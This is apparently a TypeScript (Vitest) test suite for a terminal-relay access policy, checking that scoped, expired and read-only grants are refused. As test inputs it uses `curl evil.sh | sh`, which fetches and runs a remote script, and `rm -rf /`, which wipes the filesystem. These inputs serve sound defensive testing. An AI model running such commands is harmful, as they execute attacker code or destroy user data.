import { describe, expect, it } from "vitest";
import type { GrantRecord } from "@repo/protocol";

import {
  POLICY,
  clientMessageTypes,
  enforce,
} from "./policy.js";
import { FULL_GRANT } from "./grant.js";

function grant(over: Partial<GrantRecord> = {}): GrantRecord {
  return {
    ...FULL_GRANT,
    id: "grn_test",
    scope: { kind: "sessions", sessions: [{ id: "$1", name: "work" }] },
    files: "none",
    ...over,
  };
}

describe("the policy table", () => {
  /**
   * The most important test in this file.
   *
   * Per-case guards rot by omission: someone adds `pane:teleport` to the
   * protocol, wires it into the router, and it ships with no rule because
   * nothing forced them to write one. Iterating the zod union means the
   * protocol itself is the checklist.
   */
  it("has an entry for every client message type", () => {
    const types = clientMessageTypes();
    expect(types.length).toBeGreaterThan(20);

    const missing = types.filter((type) => !(type in POLICY));
    expect(missing).toEqual([]);
  });

  it("has no entries for messages that no longer exist", () => {
    const types = new Set(clientMessageTypes());
    const stale = Object.keys(POLICY).filter((type) => !types.has(type));
    expect(stale).toEqual([]);
  });

  it("refuses an unknown message type rather than allowing it", async () => {
    const result = await enforce({ grant: FULL_GRANT, attachedSession: null }, {
      type: "not-a-real-message",
    } as never);
    expect(result.ok).toBe(false);
  });
});

describe("enforce", () => {
  const ctx = (over: Partial<GrantRecord> = {}) => ({
    grant: grant(over),
    attachedSession: null,
  });

  it("lets the full grant do anything the relay used to allow", async () => {
    // The self-hosted path. An install with no shares only ever sees this
    // grant, and must behave exactly as it did before scoping existed.
    for (const type of clientMessageTypes()) {
      if (type === "auth") continue;
      const result = await enforce(
        { grant: FULL_GRANT, attachedSession: "work" },
        { type, name: "work", oldName: "work" } as never,
      );
      // Pane/window messages still need a real id from tmux, which is not
      // available here — everything else must pass unconditionally.
      if (POLICY[type as keyof typeof POLICY]?.paneId) continue;
      if (POLICY[type as keyof typeof POLICY]?.windowId) continue;
      expect(result, `full grant refused ${type}`).toEqual({ ok: true });
    }
  });

  /**
   * `conn.grant` is snapshotted at authentication and never looked at again,
   * so before this an expired share kept every right it had at the moment it
   * was used — `expiresAt` was written down and then ignored.
   */
  it("refuses everything once the grant has expired", async () => {
    const expired = { ...FULL_GRANT, id: "grn_x", expiresAt: Date.now() - 1 };
    for (const type of ["terminal:input", "session:list", "ping"] as const) {
      const result = await enforce(
        { grant: expired, attachedSession: "work" },
        { type, data: "ls", timestamp: 0 } as never,
      );
      expect(result, `expired grant allowed ${type}`).toMatchObject({
        ok: false,
        code: "ACCESS_DENIED",
      });
    }
  });

  it("still admits a grant whose expiry is in the future", async () => {
    const live = { ...FULL_GRANT, id: "grn_y", expiresAt: Date.now() + 60_000 };
    const result = await enforce({ grant: live, attachedSession: "work" }, {
      type: "session:list",
    } as never);
    expect(result).toEqual({ ok: true });
  });

  /**
   * `session:create` hands tmux a `command`, which tmux runs through /bin/sh.
   * `write` alone was letting a narrow share turn itself into an arbitrary
   * process on the machine.
   */
  it("refuses session:create on a scoped grant", async () => {
    const result = await enforce(ctx({ id: "grn_z" }), {
      type: "session:create",
      name: "new",
      command: "curl evil.sh | sh",
    } as never);
    expect(result).toMatchObject({ ok: false, code: "ACCESS_DENIED" });
  });

  it("refuses writes on a read-only grant", async () => {
    const result = await enforce(ctx({ readOnly: true }), {
      type: "terminal:input",
      data: "rm -rf /",
    } as never);
    expect(result).toMatchObject({ ok: false, code: "READ_ONLY" });
  });

  it("allows a resize on a read-only grant", async () => {
    // Not a write. Refusing it would leave the viewer with an unusably sized
    // terminal, which is a bug rather than a boundary.
    const result = await enforce(ctx({ readOnly: true }), {
      type: "terminal:resize",
      size: { cols: 80, rows: 24 },
    } as never);
    expect(result).toEqual({ ok: true });
  });

  it("refuses every file operation when files are off", async () => {
    for (const type of ["file:list", "file:read", "file:stat", "file:watch"]) {
      const result = await enforce(ctx(), { type, path: "/etc" } as never);
      expect(result, `${type} was allowed`).toMatchObject({
        ok: false,
        code: "ACCESS_DENIED",
      });
    }
  });

  it("allows reads but not writes at files: read", async () => {
    expect(
      await enforce(ctx({ files: "read" }), {
        type: "file:read",
        path: "/tmp/x",
      } as never),
    ).toEqual({ ok: true });

    expect(
      await enforce(ctx({ files: "read" }), {
        type: "file:delete",
        path: "/tmp/x",
      } as never),
    ).toMatchObject({ ok: false, code: "ACCESS_DENIED" });
  });

  it("always allows unwatch, so a downgrade cannot leak watchers", async () => {
    expect(
      await enforce(ctx(), { type: "file:unwatch", path: "/tmp" } as never),
    ).toEqual({ ok: true });
  });

  it("refuses session:rename for anything narrower than full scope", async () => {
    const result = await enforce(ctx({ readOnly: false }), {
      type: "session:rename",
      oldName: "work",
      newName: "mine",
    } as never);
    expect(result).toMatchObject({ ok: false });
  });

  it("never leaks a session name through the refusal code", async () => {
    // A scoped holder must not be able to tell "exists but denied" from
    // "does not exist" — that difference is an enumeration oracle for every
    // session name on the machine.
    const denied = await enforce(ctx(), {
      type: "session:attach",
      name: "secret-prod",
    } as never);
    expect(denied).toMatchObject({ ok: false, code: "SESSION_NOT_FOUND" });
  });

  it("refuses a pane id with no attached session", async () => {
    expect(
      await enforce(ctx(), { type: "pane:capture", id: "%7" } as never),
    ).toMatchObject({ ok: false, code: "NOT_ATTACHED" });
  });

  it("refuses a pane message with no id at all", async () => {
    expect(
      await enforce({ grant: FULL_GRANT, attachedSession: "work" }, {
        type: "pane:capture",
      } as never),
    ).toMatchObject({ ok: false });
  });
});
